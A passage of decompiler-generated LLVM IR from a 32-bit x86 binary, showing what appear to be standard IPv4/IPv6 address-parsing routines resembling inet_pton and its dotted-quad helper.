  %v4_805107c.pre = phi i32 [ %v4_805107c.pre.pre, %dec_label_pc_8051090.lr.ph ], [ %v6_805107c27, %dec_label_pc_8051084 ]
  %v6_805108a38 = phi i32 [ %v6_805108a33, %dec_label_pc_8051090.lr.ph ], [ %v6_805108a, %dec_label_pc_8051084 ]
  %v2_805108a37 = phi i8 [ %v2_805108a30, %dec_label_pc_8051090.lr.ph ], [ %v2_805108a, %dec_label_pc_8051084 ]
  %v0_805108936 = phi i32 [ %v4_8051071, %dec_label_pc_8051090.lr.ph ], [ %v1_8051089, %dec_label_pc_8051084 ]
  %v0_805109435 = phi i32 [ 0, %dec_label_pc_8051090.lr.ph ], [ %v1_8051088, %dec_label_pc_8051084 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_805107c19 = load i8, i8* %v1_805107c18, align 1
  %v3_805107c20 = zext i8 %v2_805107c19 to i32
  %v5_805107c21 = and i32 %v4_805107c.pre, -256
  %v6_805107c22 = or i32 %v3_805107c20, %v5_805107c21
  store i32 %v6_805107c22, i32* @ecx, align 4
  %v4_805107e23 = icmp eq i8 %v2_805107c19, 0
  %v1_805108024 = icmp eq i1 %v4_805107e23, false
  br i1 %v1_805108024, label %dec_label_pc_8051077, label %dec_label_pc_8051094

dec_label_pc_8051094:                             ; preds = %dec_label_pc_8051068, %dec_label_pc_8051084, %dec_label_pc_8051090, %dec_label_pc_805107b
  %v0_805109417 = phi i32 [ %v0_805109435, %dec_label_pc_805107b ], [ %v0_805109435, %dec_label_pc_8051090 ], [ 0, %dec_label_pc_8051068 ], [ %v1_8051088, %dec_label_pc_8051084 ]
  ret i32 %v0_805109417

; uselistorder directives
  uselistorder i32 %v6_805107c22, { 1, 0 }
  uselistorder i8 %v2_805107c19, { 1, 2, 0 }
  uselistorder i32 %v1_8051089, { 1, 0 }
  uselistorder i32 %v6_805107c, { 1, 0 }
  uselistorder i8 %v2_805107c, { 1, 2, 0 }
  uselistorder i32 %v1_805107b, { 2, 1, 0 }
  uselistorder i8 %v2_805108a30, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051094, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8051090, { 1, 0 }
}

define i32 @function_805109c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805109c:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_805109e = load i32, i32* @esi, align 4
  %v0_80510a5 = load i32, i32* @eax, align 4
  store i32 %v0_80510a5, i32* %ebx.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  store i32 0, i32* @edi, align 4
  %v2_80510ab = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80510ab, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_80510f315 = inttoptr i32 %v0_80510a5 to i8*
  %v2_80510f316 = load i8, i8* %v1_80510f315, align 1
  %v3_80510f317 = sext i8 %v2_80510f316 to i32
  store i32 %v3_80510f317, i32* @ecx, align 4
  %v1_80510f618 = add i32 %v0_80510a5, 1
  store i32 %v1_80510f618, i32* %ebx.global-to-local, align 4
  %v1_80510f719 = icmp eq i8 %v2_80510f316, 0
  %v1_80510f920 = icmp eq i1 %v1_80510f719, false
  br i1 %v1_80510f920, label %dec_label_pc_80510b6, label %dec_label_pc_80510fb.thread

dec_label_pc_80510fb.thread:                      ; preds = %dec_label_pc_805109c
  br label %dec_label_pc_8051118

dec_label_pc_80510b6:                             ; preds = %dec_label_pc_805109c, %dec_label_pc_80510f3.backedge
  %v3_80510f322 = phi i32 [ %v3_80510f3, %dec_label_pc_80510f3.backedge ], [ %v3_80510f317, %dec_label_pc_805109c ]
  %v2_80510f321 = phi i8 [ %v2_80510f3, %dec_label_pc_80510f3.backedge ], [ %v2_80510f316, %dec_label_pc_805109c ]
  %v1_80510b6 = add nsw i32 %v3_80510f322, -48
  store i32 %v1_80510b6, i32* %eax.global-to-local, align 4
  %v6_80510bc = icmp ugt i32 %v1_80510b6, 9
  br i1 %v6_80510bc, label %dec_label_pc_80510df, label %dec_label_pc_80510be

dec_label_pc_80510be:                             ; preds = %dec_label_pc_80510b6
  %v0_80510be = load i32, i32* @esi, align 4
  %v1_80510be = inttoptr i32 %v0_80510be to i8*
  %v2_80510be = load i8, i8* %v1_80510be, align 1
  %v2_80510c1 = zext i8 %v2_80510be to i32
  %v3_80510c1 = mul nuw nsw i32 %v2_80510c1, 10
  %v3_80510c4 = add nsw i32 %v3_80510c1, %v1_80510b6
  store i32 %v3_80510c4, i32* %eax.global-to-local, align 4
  %v6_80510cd = icmp ugt i32 %v3_80510c4, 255
  br i1 %v6_80510cd, label %dec_label_pc_8051118, label %dec_label_pc_80510cf

dec_label_pc_80510cf:                             ; preds = %dec_label_pc_80510be
  %v1_80510cf = trunc i32 %v3_80510c4 to i8
  store i8 %v1_80510cf, i8* %v1_80510be, align 1
  %v0_80510d1 = load i32, i32* @edx, align 4
  %v1_80510d1 = icmp eq i32 %v0_80510d1, 0
  %v1_80510d3 = icmp eq i1 %v1_80510d1, false
  br i1 %v1_80510d3, label %dec_label_pc_80510f3.backedge, label %dec_label_pc_80510d5

dec_label_pc_80510d5:                             ; preds = %dec_label_pc_80510cf
  %v0_80510d5 = load i32, i32* @edi, align 4
  %v1_80510d5 = add i32 %v0_80510d5, 1
  store i32 %v1_80510d5, i32* @edi, align 4
  %v1_80510d6 = add i32 %v0_80510d5, -3
  %v6_80510d6 = sub i32 2, %v0_80510d5
  %v7_80510d6 = and i32 %v6_80510d6, %v1_80510d5
  %v8_80510d6 = icmp slt i32 %v7_80510d6, 0
  %v9_80510d6 = icmp eq i32 %v1_80510d6, 0
  %v10_80510d6 = icmp slt i32 %v1_80510d6, 0
  %v3_80510d9 = icmp eq i1 %v10_80510d6, %v8_80510d6
  %v4_80510d9 = icmp eq i1 %v9_80510d6, false
  %v5_80510d9 = and i1 %v4_80510d9, %v3_80510d9
  br i1 %v5_80510d9, label %dec_label_pc_8051118, label %dec_label_pc_80510db

dec_label_pc_80510db:                             ; preds = %dec_label_pc_80510d5
  %v1_80510db = and i32 %v0_80510d1, -256
  %v2_80510db = or i32 %v1_80510db, 1
  store i32 %v2_80510db, i32* @edx, align 4
  br label %dec_label_pc_80510f3.backedge

dec_label_pc_80510df:                             ; preds = %dec_label_pc_80510b6
  %v9_80510df = icmp eq i8 %v2_80510f321, 46
  %v1_80510e2 = icmp eq i1 %v9_80510df, false
  br i1 %v1_80510e2, label %dec_label_pc_8051118, label %dec_label_pc_80510e4

dec_label_pc_80510e4:                             ; preds = %dec_label_pc_80510df
  %v0_80510e4 = load i32, i32* @edx, align 4
  %v1_80510e4 = icmp eq i32 %v0_80510e4, 0
  br i1 %v1_80510e4, label %dec_label_pc_8051118, label %dec_label_pc_80510e8

dec_label_pc_80510e8:                             ; preds = %dec_label_pc_80510e4
  %v0_80510e8 = load i32, i32* @edi, align 4
  %v9_80510e8 = icmp eq i32 %v0_80510e8, 4
  br i1 %v9_80510e8, label %dec_label_pc_8051118, label %dec_label_pc_80510ed

dec_label_pc_80510ed:                             ; preds = %dec_label_pc_80510e8
  %v0_80510ed = load i32, i32* @esi, align 4
  %v1_80510ed = add i32 %v0_80510ed, 1
  store i32 %v1_80510ed, i32* @esi, align 4
  store i32 0, i32* @edx, align 4
  %v1_80510f0 = inttoptr i32 %v1_80510ed to i8*
  store i8 0, i8* %v1_80510f0, align 1
  br label %dec_label_pc_80510f3.backedge

dec_label_pc_80510f3.backedge:                    ; preds = %dec_label_pc_80510ed, %dec_label_pc_80510db, %dec_label_pc_80510cf
  %v0_80510f3.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80510f3 = inttoptr i32 %v0_80510f3.pre to i8*
  %v2_80510f3 = load i8, i8* %v1_80510f3, align 1
  %v3_80510f3 = sext i8 %v2_80510f3 to i32
  store i32 %v3_80510f3, i32* @ecx, align 4
  %v1_80510f6 = add i32 %v0_80510f3.pre, 1
  store i32 %v1_80510f6, i32* %ebx.global-to-local, align 4
  %v1_80510f7 = icmp eq i8 %v2_80510f3, 0
  %v1_80510f9 = icmp eq i1 %v1_80510f7, false
  br i1 %v1_80510f9, label %dec_label_pc_80510b6, label %dec_label_pc_80510fb

dec_label_pc_80510fb:                             ; preds = %dec_label_pc_80510f3.backedge
  %v0_80510fb.pre = load i32, i32* @edi, align 4
  %v7_80510fe = icmp sgt i32 %v0_80510fb.pre, 3
  br i1 %v7_80510fe, label %dec_label_pc_8051100, label %dec_label_pc_8051118

dec_label_pc_8051100:                             ; preds = %dec_label_pc_80510fb
  %v0_8051100 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v2_80510ab, i32* %eax.global-to-local, align 4
  %v3_8051109 = bitcast i32* %stack_var_-20 to i16*
  %v4_8051109 = call i32 @function_804ce38(i16* %v3_8051109, i32 4, i32 %v0_8051100)
  br label %dec_label_pc_805111a

dec_label_pc_8051118:                             ; preds = %dec_label_pc_80510e8, %dec_label_pc_80510e4, %dec_label_pc_80510df, %dec_label_pc_80510d5, %dec_label_pc_80510be, %dec_label_pc_80510fb.thread, %dec_label_pc_80510fb
  br label %dec_label_pc_805111a

dec_label_pc_805111a:                             ; preds = %dec_label_pc_8051100, %dec_label_pc_8051118
  %storemerge = phi i32 [ 0, %dec_label_pc_8051118 ], [ 1, %dec_label_pc_8051100 ]
  %v0_8051121 = phi i32 [ 0, %dec_label_pc_8051118 ], [ 1, %dec_label_pc_8051100 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805109e, i32* @esi, align 4
  ret i32 %v0_8051121

; uselistorder directives
  uselistorder i32 %v3_80510f3, { 1, 0 }
  uselistorder i8 %v2_80510f3, { 1, 2, 0 }
  uselistorder i32 %v1_80510d6, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 255, { 5, 1, 6, 7, 8, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_805111a, { 1, 0 }
  uselistorder label %dec_label_pc_8051118, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_80510b6, { 1, 0 }
}

define i32 @function_8051122(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051122:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8051122 = load i32, i32* @ebp, align 4
  %v0_8051123 = load i32, i32* @edi, align 4
  %v0_8051124 = load i32, i32* @esi, align 4
  %v0_8051125 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_805112d = ptrtoint i8* %arg2 to i32
  store i32 %v4_805112d, i32* @edi, align 4
  %v9_8051131 = icmp eq i32 %arg1, 2
  br i1 %v9_8051131, label %dec_label_pc_8051141, label %dec_label_pc_8051136

dec_label_pc_8051136:                             ; preds = %dec_label_pc_8051122
  %v9_8051136 = icmp eq i32 %arg1, 10
  %v1_8051139 = icmp eq i1 %v9_8051136, false
  br i1 %v1_8051139, label %dec_label_pc_80512d2, label %dec_label_pc_8051151

dec_label_pc_8051141:                             ; preds = %dec_label_pc_8051122
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_805112d, i32* @eax, align 4
  %v3_8051147 = call i32 @function_805109c(i32 %v0_8051125, i32 %v0_8051124, i32 %v0_8051123)
  store i32 %v3_8051147, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80512e4

dec_label_pc_8051151:                             ; preds = %dec_label_pc_8051136
  %v2_8051156 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051156, i32* %eax.global-to-local, align 4
  %tmp60 = bitcast i32* %stack_var_-32 to i8*
  %v5_805115b = call i32 @function_804ce60(i8* %tmp60, i32 0, i32 16)
  store i32 %v5_805115b, i32* @ebx, align 4
  %v2_8051162 = add i32 %v5_805115b, 16
  store i32 %v2_8051162, i32* %eax.global-to-local, align 4
  %v0_805116c = load i32, i32* @edi, align 4
  %v1_805116c = inttoptr i32 %v0_805116c to i8*
  %v2_805116c = load i8, i8* %v1_805116c, align 1
  %v11_805116c = icmp eq i8 %v2_805116c, 58
  %v1_805116f = icmp eq i1 %v11_805116c, false
  br i1 %v1_805116f, label %dec_label_pc_8051202, label %dec_label_pc_8051171

dec_label_pc_8051171:                             ; preds = %dec_label_pc_8051151
  %v1_8051171 = add i32 %v0_805116c, 1
  store i32 %v1_8051171, i32* @edi, align 4
  %v1_8051172 = inttoptr i32 %v1_8051171 to i8*
  %v2_8051172 = load i8, i8* %v1_8051172, align 1
  %v11_8051172 = icmp eq i8 %v2_8051172, 58
  %v1_8051175 = icmp eq i1 %v11_8051172, false
  br i1 %v1_8051175, label %dec_label_pc_80512e2, label %dec_label_pc_8051202

dec_label_pc_8051189:                             ; preds = %dec_label_pc_8051242
  %v0_8051189 = load i32, i32* @ecx, align 4
  %v7_8051191 = call i32 @function_8051c54(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8054614.208, i32 0, i32 0), i32 %v2_8051249, i32 %v0_8051189, i32 %v0_8051189)
  store i32 %v7_8051191, i32* %eax.global-to-local, align 4
  %v0_8051196 = load i32, i32* @edi, align 4
  %v1_8051196 = add i32 %v0_8051196, 1
  store i32 %v1_8051196, i32* @edi, align 4
  %v1_805119a = icmp eq i32 %v7_8051191, 0
  br i1 %v1_805119a, label %dec_label_pc_80511b9, label %dec_label_pc_805119e

dec_label_pc_805119e:                             ; preds = %dec_label_pc_8051189
  %v0_805119e = load i32, i32* @ebp, align 4
  %v2_805119e = mul i32 %v0_805119e, 16
  %v1_80511a1 = add i32 %v7_8051191, -134563348
  store i32 %v1_80511a1, i32* %eax.global-to-local, align 4
  %v2_80511a6 = or i32 %v2_805119e, %v1_80511a1
  store i32 %v2_80511a6, i32* @ebp, align 4
  %tmp126 = icmp ult i32 %v2_80511a6, 65536
  br i1 %tmp126, label %dec_label_pc_8051242.outer, label %dec_label_pc_80512e2

dec_label_pc_8051242.outer:                       ; preds = %dec_label_pc_805119e, %dec_label_pc_8051202
  %v0_805124536 = phi i32 [ %v1_8051196, %dec_label_pc_805119e ], [ %stack_var_-36.0.in, %dec_label_pc_8051202 ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_805119e ], [ %stack_var_-44.0, %dec_label_pc_8051202 ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_805119e ], [ %stack_var_-36.0, %dec_label_pc_8051202 ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_805119e ], [ 0, %dec_label_pc_8051202 ]
  %v4_80511be = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_80511c3 = icmp eq i1 %v4_80511be, false
  br label %dec_label_pc_8051242

dec_label_pc_80511b9:                             ; preds = %dec_label_pc_8051189
  %v0_80511b9 = load i32, i32* @esi, align 4
  %v9_80511b9 = icmp eq i32 %v0_80511b9, 58
  %v1_80511bc = icmp eq i1 %v9_80511b9, false
  br i1 %v1_80511bc, label %dec_label_pc_805120e, label %dec_label_pc_80511be

dec_label_pc_80511be:                             ; preds = %dec_label_pc_80511b9
  br i1 %v1_80511c3, label %dec_label_pc_80511da, label %dec_label_pc_80511c5

dec_label_pc_80511c5:                             ; preds = %dec_label_pc_80511be
  %v5_80511c5 = icmp eq i8* %stack_var_-44.1, null
  %v1_80511ca = icmp eq i1 %v5_80511c5, false
  br i1 %v1_80511ca, label %dec_label_pc_80512e2, label %dec_label_pc_80511d0

dec_label_pc_80511d0:                             ; preds = %dec_label_pc_80511c5
  %v0_80511d0 = load i32, i32* @ebx, align 4
  %v5_80511d0 = inttoptr i32 %v0_80511d0 to i8*
  %v5_80511d4 = inttoptr i32 %v1_8051196 to i8*
  br label %dec_label_pc_8051242

dec_label_pc_80511da:                             ; preds = %dec_label_pc_80511be
  %v1_80511da = inttoptr i32 %v1_8051196 to i8*
  %v2_80511da = load i8, i8* %v1_80511da, align 1
  %v3_80511da = icmp eq i8 %v2_80511da, 0
  br i1 %v3_80511da, label %dec_label_pc_80512e2, label %dec_label_pc_80511e3

dec_label_pc_80511e3:                             ; preds = %dec_label_pc_80511da
  %v0_80511e3 = load i32, i32* @ebx, align 4
  %v1_80511e3 = add i32 %v0_80511e3, 2
  store i32 %v1_80511e3, i32* @edx, align 4
  %v6_80511ea = icmp ugt i32 %v1_80511e3, %v2_8051162
  br i1 %v6_80511ea, label %dec_label_pc_80512e2, label %dec_label_pc_80511f0

dec_label_pc_80511f0:                             ; preds = %dec_label_pc_80511e3
  %v0_80511f0 = load i32, i32* @ebp, align 4
  %v2_80511f2 = udiv i32 %v0_80511f0, 256
  %v4_80511f2 = trunc i32 %v2_80511f2 to i8
  %v3_80511f5 = inttoptr i32 %v0_80511e3 to i8*
  store i8 %v4_80511f2, i8* %v3_80511f5, align 1
  %v0_80511f7 = load i32, i32* @ebp, align 4
  store i32 %v0_80511f7, i32* %eax.global-to-local, align 4
  %v1_80511f9 = trunc i32 %v0_80511f7 to i8
  %v2_80511f9 = load i32, i32* @ebx, align 4
  %v3_80511f9 = add i32 %v2_80511f9, 1
  %v4_80511f9 = inttoptr i32 %v3_80511f9 to i8*
  store i8 %v1_80511f9, i8* %v4_80511f9, align 1
  %v0_80511fc = load i32, i32* @edx, align 4
  store i32 %v0_80511fc, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051202

dec_label_pc_8051202:                             ; preds = %dec_label_pc_8051151, %dec_label_pc_8051171, %dec_label_pc_80511f0
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_80511f0 ], [ %v1_8051171, %dec_label_pc_8051171 ], [ %v0_805116c, %dec_label_pc_8051151 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_80511f0 ], [ null, %dec_label_pc_8051171 ], [ null, %dec_label_pc_8051151 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8051242.outer

dec_label_pc_805120e:                             ; preds = %dec_label_pc_80511b9
  %v9_805120e = icmp eq i32 %v0_80511b9, 46
  %v1_8051211 = icmp eq i1 %v9_805120e, false
  br i1 %v1_8051211, label %dec_label_pc_80512e2, label %dec_label_pc_8051217

dec_label_pc_8051217:                             ; preds = %dec_label_pc_805120e
  %v0_8051217 = load i32, i32* @ebx, align 4
  %v1_8051217 = add i32 %v0_8051217, 4
  store i32 %v1_8051217, i32* @esi, align 4
  %v6_805121e = icmp ugt i32 %v1_8051217, %v2_8051162
  br i1 %v6_805121e, label %dec_label_pc_80512e2, label %dec_label_pc_8051224

dec_label_pc_8051224:                             ; preds = %dec_label_pc_8051217
  store i32 %v0_8051217, i32* @edx, align 4
  %v4_8051226 = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_8051226, i32* @eax, align 4
  %v2_805122a = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_805122a = call i32 @function_805109c(i32 %stack_var_-48.0.ph, i32 %v2_805122a, i32 %v2_8051162)
  store i32 %v5_805122a, i32* %eax.global-to-local, align 4
  %v0_805122f = load i32, i32* @esi, align 4
  %tmp61 = icmp slt i32 %v5_805122a, 1
  %tmp62 = icmp eq i1 %tmp61, false
  br i1 %tmp62, label %dec_label_pc_8051279, label %dec_label_pc_80512e2

dec_label_pc_8051242:                             ; preds = %dec_label_pc_8051242.outer, %dec_label_pc_80511d0
  %v0_8051245 = phi i32 [ %v1_8051196, %dec_label_pc_80511d0 ], [ %v0_805124536, %dec_label_pc_8051242.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_80511d0, %dec_label_pc_80511d0 ], [ %stack_var_-44.1.ph, %dec_label_pc_8051242.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_80511d4, %dec_label_pc_80511d0 ], [ %stack_var_-36.1.ph, %dec_label_pc_8051242.outer ]
  %v1_8051245 = inttoptr i32 %v0_8051245 to i8*
  %v2_8051245 = load i8, i8* %v1_8051245, align 1
  %v3_8051245 = sext i8 %v2_8051245 to i32
  store i32 %v3_8051245, i32* %eax.global-to-local, align 4
  %v2_8051249 = call i32 @function_8051c34(i32 %v3_8051245)
  store i32 %v2_8051249, i32* %eax.global-to-local, align 4
  store i32 %v2_8051249, i32* @esi, align 4
  %v1_8051253 = icmp eq i32 %v2_8051249, 0
  %v1_8051255 = icmp eq i1 %v1_8051253, false
  br i1 %v1_8051255, label %dec_label_pc_8051189, label %dec_label_pc_805125b

dec_label_pc_805125b:                             ; preds = %dec_label_pc_8051242
  %v0_80512b1.pre.pre = load i32, i32* @ebx, align 4
  br i1 %v4_80511be, label %dec_label_pc_8051279, label %dec_label_pc_8051262

dec_label_pc_8051262:                             ; preds = %dec_label_pc_805125b
  %v1_8051262 = add i32 %v0_80512b1.pre.pre, 2
  store i32 %v1_8051262, i32* @edx, align 4
  %v6_8051269 = icmp ugt i32 %v1_8051262, %v2_8051162
  br i1 %v6_8051269, label %dec_label_pc_80512e2, label %dec_label_pc_805126b

dec_label_pc_805126b:                             ; preds = %dec_label_pc_8051262
  %v0_805126b = load i32, i32* @ebp, align 4
  %v2_805126d = udiv i32 %v0_805126b, 256
  %v4_805126d = trunc i32 %v2_805126d to i8
  %v3_8051270 = inttoptr i32 %v0_80512b1.pre.pre to i8*
  store i8 %v4_805126d, i8* %v3_8051270, align 1
  %v0_8051272 = load i32, i32* @ebp, align 4
  store i32 %v0_8051272, i32* %eax.global-to-local, align 4
  %v1_8051274 = trunc i32 %v0_8051272 to i8
  %v2_8051274 = load i32, i32* @ebx, align 4
  %v3_8051274 = add i32 %v2_8051274, 1
  %v4_8051274 = inttoptr i32 %v3_8051274 to i8*
  store i8 %v1_8051274, i8* %v4_8051274, align 1
  %v0_8051277 = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051279

dec_label_pc_8051279:                             ; preds = %dec_label_pc_805125b, %dec_label_pc_8051224, %dec_label_pc_805126b
  %v0_80512b1.pre = phi i32 [ %v0_805122f, %dec_label_pc_8051224 ], [ %v0_8051277, %dec_label_pc_805126b ], [ %v0_80512b1.pre.pre, %dec_label_pc_805125b ]
  %v4_8051279 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8051279 = icmp eq i8* %stack_var_-44.1, null
  br i1 %v5_8051279, label %dec_label_pc_80512b1, label %dec_label_pc_8051280

dec_label_pc_8051280:                             ; preds = %dec_label_pc_8051279
  store i32 1, i32* @esi, align 4
  %v6_8051287 = sub i32 %v0_80512b1.pre, %v4_8051279
  store i32 %v6_8051287, i32* @edi, align 4
  %v16_805128b = icmp eq i32 %v0_80512b1.pre, %v2_8051162
  %v1_805128f = icmp eq i1 %v16_805128b, false
  br i1 %v1_805128f, label %dec_label_pc_80512a9.preheader, label %dec_label_pc_80512e2

dec_label_pc_80512a9.preheader:                   ; preds = %dec_label_pc_8051280
  %v3_80512a994 = inttoptr i32 %v6_8051287 to i8*
  %v9_80512ab97 = icmp slt i8* %v3_80512a994, inttoptr (i32 1 to i8*)
  br i1 %v9_80512ab97, label %dec_label_pc_80512b1.thread, label %dec_label_pc_8051293

dec_label_pc_8051293:                             ; preds = %dec_label_pc_80512a9.preheader, %dec_label_pc_8051293
  %v0_80512a199 = phi i32 [ %v0_80512a9.pre, %dec_label_pc_8051293 ], [ 1, %dec_label_pc_80512a9.preheader ]
  %v0_805129398 = phi i32 [ %v1_80512a9.pre, %dec_label_pc_8051293 ], [ %v6_8051287, %dec_label_pc_80512a9.preheader ]
  %v2_8051299 = sub i32 %v0_805129398, %v0_80512a199
  %v2_805129b = sub i32 %v2_8051162, %v0_80512a199
  %v6_805129d = add i32 %v2_8051299, %v4_8051279
  store i32 %v6_805129d, i32* %eax.global-to-local, align 4
  %v1_80512a1 = add i32 %v0_80512a199, 1
  store i32 %v1_80512a1, i32* @esi, align 4
  %v1_80512a2 = inttoptr i32 %v6_805129d to i8*
  %v2_80512a2 = load i8, i8* %v1_80512a2, align 1
  %v3_80512a2 = zext i8 %v2_80512a2 to i32
  %v4_80512a2 = load i32, i32* @edx, align 4
  %v5_80512a2 = and i32 %v4_80512a2, -256
  %v6_80512a2 = or i32 %v5_80512a2, %v3_80512a2
  store i32 %v6_80512a2, i32* @edx, align 4
  %v3_80512a4 = inttoptr i32 %v2_805129b to i8*
  store i8 %v2_80512a2, i8* %v3_80512a4, align 1
  %v0_80512a6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80512a6 = inttoptr i32 %v0_80512a6 to i8*
  store i8 0, i8* %v1_80512a6, align 1
  %v0_80512a9.pre = load i32, i32* @esi, align 4
  %v1_80512a9.pre = load i32, i32* @edi, align 4
  %v2_80512a9 = inttoptr i32 %v0_80512a9.pre to i8*
  %v3_80512a9 = inttoptr i32 %v1_80512a9.pre to i8*
  %v9_80512ab = icmp sgt i8* %v2_80512a9, %v3_80512a9
  br i1 %v9_80512ab, label %dec_label_pc_80512b1.thread, label %dec_label_pc_8051293

dec_label_pc_80512b1.thread:                      ; preds = %dec_label_pc_8051293, %dec_label_pc_80512a9.preheader
  br label %dec_label_pc_80512b7

dec_label_pc_80512b1:                             ; preds = %dec_label_pc_8051279
  %v16_80512b1 = icmp eq i32 %v0_80512b1.pre, %v2_8051162
  %v1_80512b5 = icmp eq i1 %v16_80512b1, false
  br i1 %v1_80512b5, label %dec_label_pc_80512e2, label %dec_label_pc_80512b7

dec_label_pc_80512b7:                             ; preds = %dec_label_pc_80512b1.thread, %dec_label_pc_80512b1
  store i32 %v2_8051156, i32* %eax.global-to-local, align 4
  %tmp63 = inttoptr i32 %arg3 to i16*
  %v5_80512c3 = call i32 @function_804ce38(i16* %tmp63, i32 %v2_8051156, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80512e4

dec_label_pc_80512d2:                             ; preds = %dec_label_pc_8051136
  %v1_80512d2 = call i32 @function_804b4bc(i32 %v0_8051125)
  %v1_80512d7 = inttoptr i32 %v1_80512d2 to i32*
  store i32 97, i32* %v1_80512d7, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80512e4

dec_label_pc_80512e2:                             ; preds = %dec_label_pc_80511e3, %dec_label_pc_80511da, %dec_label_pc_805119e, %dec_label_pc_80511c5, %dec_label_pc_8051280, %dec_label_pc_8051224, %dec_label_pc_80512b1, %dec_label_pc_8051262, %dec_label_pc_8051217, %dec_label_pc_805120e, %dec_label_pc_8051171
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80512e4

dec_label_pc_80512e4:                             ; preds = %dec_label_pc_80512d2, %dec_label_pc_80512b7, %dec_label_pc_8051141, %dec_label_pc_80512e2
  %v0_80512eb = phi i32 [ -1, %dec_label_pc_80512d2 ], [ 1, %dec_label_pc_80512b7 ], [ %v3_8051147, %dec_label_pc_8051141 ], [ 0, %dec_label_pc_80512e2 ]
  store i32 %v0_8051125, i32* @ebx, align 4
  store i32 %v0_8051124, i32* @esi, align 4
  store i32 %v0_8051123, i32* @edi, align 4
  store i32 %v0_8051122, i32* @ebp, align 4
  ret i32 %v0_80512eb

; uselistorder directives
  uselistorder i32 %v1_80512a9.pre, { 1, 0 }
  uselistorder i32 %v0_80512a9.pre, { 1, 0 }
  uselistorder i32 %v0_80512a199, { 2, 1, 0 }
  uselistorder i32 %v0_80512b1.pre, { 2, 1, 0 }
  uselistorder i32 %v0_80512b1.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_8051249, { 2, 1, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v1_8051196, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_8051162, { 0, 2, 1, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_8051125, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 (i32, i32, i32)* @function_805109c, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_80512e4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80512e2, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_80512b7, { 1, 0 }
  uselistorder label %dec_label_pc_8051293, { 1, 0 }
  uselistorder label %dec_label_pc_8051279, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051242, { 1, 0 }
  uselistorder label %dec_label_pc_8051202, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051242.outer, { 1, 0 }
}

define i32 @function_80512ec(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80512ec:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %v0_80512ed = load i32, i32* @edi, align 4
  %v0_80512ee = load i32, i32* @esi, align 4
  store i32 0, i32* %ebp.global-to-local, align 4
  store i1 false, i1* @df, align 1
